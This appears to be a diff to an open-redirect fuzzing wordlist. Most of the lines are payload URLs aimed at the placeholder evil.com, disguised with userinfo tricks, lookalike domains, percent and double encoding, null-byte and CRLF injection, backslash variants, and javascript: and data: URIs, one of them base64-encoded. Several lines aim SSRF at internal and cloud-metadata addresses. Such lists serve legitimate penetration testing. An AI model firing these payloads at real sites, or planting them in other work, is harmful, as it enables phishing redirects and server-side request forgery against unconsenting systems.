@@ -1,48 +1,86 @@
-https://evil.com
-http://evil.com
-//evil.com
-///evil.com
-////evil.com
+https://trusted.com@evil.com
+https://trusted.com%40evil.com
+https://trusted.com:@evil.com
+https://trusted.com:443@evil.com
+https://user:pass@evil.com#trusted.com
+https://trusted.com.evil.com
+https://evil.com.trusted.com (if *.trusted.com allowed)
+https://evil-trusted.com (if trusted.com prefix allowed)
+https://eviltrustED.com (if trusted.com substring allowed)
+https://www.trusted.com.evil.com
+https://trusted.com.attacker.com
+https://sub.trusted.com.evil.com
+https://evil.trusted.com (subdomain takeover)
+https://evil.trusted.com/ (subdomain takeover)
+//trusted.com.evil.com
+//trusted.com@evil.com
+//evil.com%2ftrusted.com
+//evil.com%2ftrusted.com%2f
+/\/evil.com
+/%09/evil.com
+/%0a/evil.com
+/%0d/evil.com
+/evil.com%2f%2e%2e
+/evil.com%2f%2e%2e%2f
+/evil.com%2f..
+//evil%00.com
+//evil%00.com/
+https://evil%00.com
+https://evil%0a.com
+https://evil%0d.com
+https://evil%09.com
+https://evil%20.com
+https://evil.com%00
+https://evil.com%00.trusted.com
+https://evil.com%0d%0atrusted.com
+https://evil.com/trusted.com
+https://evil.com?trusted.com
+https://evil.com#trusted.com
+https://evil.com/.trusted.com
+https://evil.com/?trusted.com
+http://evil.com\@trusted.com
+javascript:location='https://evil.com'
+javascript:window.location='https://evil.com'
+javascript:document.location='https://evil.com'
+javascript:location.href='https://evil.com'
+data:text/html,<meta http-equiv=refresh content=0;url=https://evil.com>
+data:text/html;base64,PHNjcmlwdD53aW5kb3cubG9jYXRpb249J2h0dHBzOi8vZXZpbC5jb20nPC9zY3JpcHQ+
+//\evil.com
 /\evil.com
 \/evil.com
-javascript://evil.com%0aalert(1)
-data:text/html,<script>location='https://evil.com'</script>
-
-https://target.com@evil.com
-https://target.com:pass@evil.com
-https://evil.com@target.com  (still goes to evil.com)
-@evil.com
-https://@evil.com
-
-https://target.com.evil.com
-https://target.com-evil.com
-https://evil.com?continue=https://target.com
-https://evil.com#target.com
-https://target.com%60.evil.com
-
-https%3A%2F%2Fevil.com
-%2F%2Fevil.com
-%5C%5Cevil.com
-https://evil%2Ecom
-https://evil%00.com
+//\/evil.com
+\\/evil.com
+////evil.com
+/////evil.com
+\/\/evil.com
+/\/evil.com
+/\/evil.com
+\/evil.com
+\evil.com
+\evil.com
+\\evil.com
+https%3a//evil.com
+https%3A//evil.com
 %68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d
-
-%252F%252Fevil.com
-%2568%2574%2574%2570%253A%252F%252Fevil.com
-
-https://[::1]
-https://[::FFFF:127.0.0.1]
-https://[0:0:0:0:0:ffff:127.0.0.1]
-
-https://0177.0.0.1  (octal)
-https://2130706433  (decimal)
-https://0x7f000001  (hex)
-https://127.1
-
-https://evil.com %09
-https://evil.com%09
-https://evil.com%20
-https://evil.com%0a
-https://evil.com%0d
-
-/redirect?url=https://target.com%0d%0aLocation: https://evil.com
+https%3a%2f%2fevil.com
+https%3A%2F%2Fevil.com
+%68ttps://evil.com
+h%74tps://evil.com
+ht%74ps://evil.com
+htt%70s://evil.com
+http%73://evil.com
+https%3a//evil.com
+https://evil.com%3a443
+https://evil.com:80/
+https://evil.com:443/
+https://evil.com:8080/
+https://evil.com:8443/
+https://evil.com:3000/
+https://evil.com:4000/
+https://evil.com:5000/
+https://evil.com:9000/
+https://169.254.169.254 (SSRF via open redirect)
+https://127.0.0.1 (SSRF via open redirect)
+https://localhost (SSRF via open redirect)
+https://10.0.0.1 (SSRF via open redirect)
+https://192.168.1.1 (SSRF via open redirect)
